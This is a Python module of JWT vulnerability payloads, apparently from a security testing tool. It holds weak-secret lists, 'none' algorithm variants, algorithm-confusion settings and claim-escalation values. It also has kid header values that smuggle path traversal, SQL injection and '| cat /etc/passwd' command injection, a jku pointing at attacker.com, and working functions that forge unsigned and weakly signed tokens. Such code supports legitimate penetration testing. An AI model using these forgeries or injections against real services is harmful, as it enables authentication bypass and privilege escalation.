"""
JWT (JSON Web Token) Vulnerability Payloads

Tests for:
- Algorithm confusion (RS256 -> HS256)
- None algorithm bypass
- Weak secret brute force
- Key injection (jwk, jku, kid)
- Signature stripping
- Token expiration bypass
"""

import base64
import json
import hmac
import hashlib
from typing import Dict, List, Optional

# Common weak JWT secrets (for testing purposes)
WEAK_SECRETS = [
    'secret', 'password', '123456', 'qwerty', 'admin', 'key',
    'private', 'jwt_secret', 'changeme', 'test', 'development',
    'default', 'supersecret', 'mysecret', 'jwtsecret', 'secretkey',
    '', ' ', 'null', 'undefined', 'none', 'your-256-bit-secret',
    'your-secret-key', 'jwt-secret', 'secret123', 'password123',
]

# Algorithm confusion payloads
ALGORITHM_CONFUSION = [
    {'from': 'RS256', 'to': 'HS256', 'type': 'rsa_to_hmac'},
    {'from': 'RS384', 'to': 'HS384', 'type': 'rsa_to_hmac'},
    {'from': 'RS512', 'to': 'HS512', 'type': 'rsa_to_hmac'},
    {'from': 'ES256', 'to': 'HS256', 'type': 'ecdsa_to_hmac'},
    {'from': 'PS256', 'to': 'HS256', 'type': 'rsapss_to_hmac'},
]

# None algorithm payloads
NONE_ALGORITHM_VARIANTS = [
    'none', 'None', 'NONE', 'nOnE',
    'none ', ' none', 'none\t', '\tnone',
    'n0ne', 'non3',
]

# Key injection payloads (JKU/JWK/KID)
KEY_INJECTION_PAYLOADS = [
    # JKU (JWK Set URL) injection
    {'header': 'jku', 'value': 'https://attacker.com/.well-known/jwks.json', 'type': 'jku_injection'},
    {'header': 'jku', 'value': 'http://localhost/.well-known/jwks.json', 'type': 'jku_ssrf'},
    {'header': 'jku', 'value': 'file:///etc/passwd', 'type': 'jku_lfi'},

    # JWK (embedded key) injection
    {'header': 'jwk', 'type': 'jwk_injection'},

    # KID (Key ID) injection
    {'header': 'kid', 'value': "../../../../../../etc/passwd", 'type': 'kid_lfi'},
    {'header': 'kid', 'value': "/dev/null", 'type': 'kid_null'},
    {'header': 'kid', 'value': "'; SELECT * FROM keys; --", 'type': 'kid_sqli'},
    {'header': 'kid', 'value': "| cat /etc/passwd", 'type': 'kid_cmdi'},
    {'header': 'kid', 'value': "AA==", 'type': 'kid_empty_key'},  # base64 of empty
]

# Common JWT claim manipulations
CLAIM_MANIPULATIONS = [
    # Role escalation
    {'claim': 'role', 'original': 'user', 'test': 'admin'},
    {'claim': 'role', 'original': 'user', 'test': 'administrator'},
    {'claim': 'roles', 'original': ['user'], 'test': ['admin', 'user']},
    {'claim': 'is_admin', 'original': False, 'test': True},
    {'claim': 'admin', 'original': '0', 'test': '1'},
    {'claim': 'privileges', 'original': 'read', 'test': 'write,admin'},

    # User ID manipulation
    {'claim': 'sub', 'original': '1234', 'test': '1'},
    {'claim': 'user_id', 'original': '1234', 'test': '1'},
    {'claim': 'uid', 'original': '1234', 'test': '1'},

    # Expiration bypass
    {'claim': 'exp', 'original': 'current', 'test': 9999999999},  # Far future
    {'claim': 'nbf', 'original': 'current', 'test': 0},  # Not before = epoch

    # Issuer/audience manipulation
    {'claim': 'iss', 'original': 'app.example.com', 'test': 'attacker.com'},
    {'claim': 'aud', 'original': 'app.example.com', 'test': '*'},
]


def base64url_encode(data: bytes) -> str:
    """Base64 URL encode without padding"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def base64url_decode(data: str) -> bytes:
    """Base64 URL decode with padding fix"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token: str) -> Optional[Dict]:
    """Decode JWT without verification"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None

        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))

        return {
            'header': header,
            'payload': payload,
            'signature': parts[2],
            'header_raw': parts[0],
            'payload_raw': parts[1],
        }
    except Exception:
        return None


def create_none_algorithm_jwt(payload: dict) -> List[str]:
    """Create JWT tokens with none algorithm variants"""
    tokens = []

    for alg in NONE_ALGORITHM_VARIANTS:
        header = {'alg': alg, 'typ': 'JWT'}
        header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

        # None algorithm = no signature
        token = f"{header_b64}.{payload_b64}."
        tokens.append(token)

        # Also try with empty signature
        token_empty = f"{header_b64}.{payload_b64}.e30"  # e30 = {}
        tokens.append(token_empty)

    return tokens


def create_hs256_with_weak_secret(payload: dict, secrets: List[str] = None) -> List[Dict]:
    """Create JWT tokens signed with weak secrets"""
    tokens = []
    test_secrets = secrets or WEAK_SECRETS[:10]

    header = {'alg': 'HS256', 'typ': 'JWT'}
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

    for secret in test_secrets:
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
        sig_b64 = base64url_encode(signature)

        token = f"{header_b64}.{payload_b64}.{sig_b64}"
        tokens.append({'token': token, 'secret': secret})

    return tokens


def create_algorithm_confusion_jwt(original_token: str, public_key: str = None) -> List[Dict]:
    """
    Create algorithm confusion attack tokens.
    For RS256->HS256, the public key becomes the HMAC secret.
    """
    decoded = decode_jwt(original_token)
    if not decoded:
        return []

    tokens = []
    payload = decoded['payload']

    # Try HS256 with common keys (if public key not provided)
    test_keys = [public_key] if public_key else ['', 'public_key', 'rsa_public']

    for alg_conf in ALGORITHM_CONFUSION:
        if decoded['header'].get('alg') == alg_conf['from']:
            new_header = decoded['header'].copy()
            new_header['alg'] = alg_conf['to']

            header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
            payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

            for key in test_keys:
                if key:
                    message = f"{header_b64}.{payload_b64}".encode()
                    signature = hmac.new(key.encode(), message, hashlib.sha256).digest()
                    sig_b64 = base64url_encode(signature)

                    token = f"{header_b64}.{payload_b64}.{sig_b64}"
                    tokens.append({
                        'token': token,
                        'attack': alg_conf['type'],
                        'key_used': key[:20] + '...' if len(key) > 20 else key
                    })

    return tokens


def get_all_jwt_payloads():
    """Get all JWT vulnerability payloads"""
    return {
        'weak_secrets': WEAK_SECRETS,
        'algorithm_confusion': ALGORITHM_CONFUSION,
        'none_algorithms': NONE_ALGORITHM_VARIANTS,
        'key_injection': KEY_INJECTION_PAYLOADS,
        'claim_manipulations': CLAIM_MANIPULATIONS,
    }
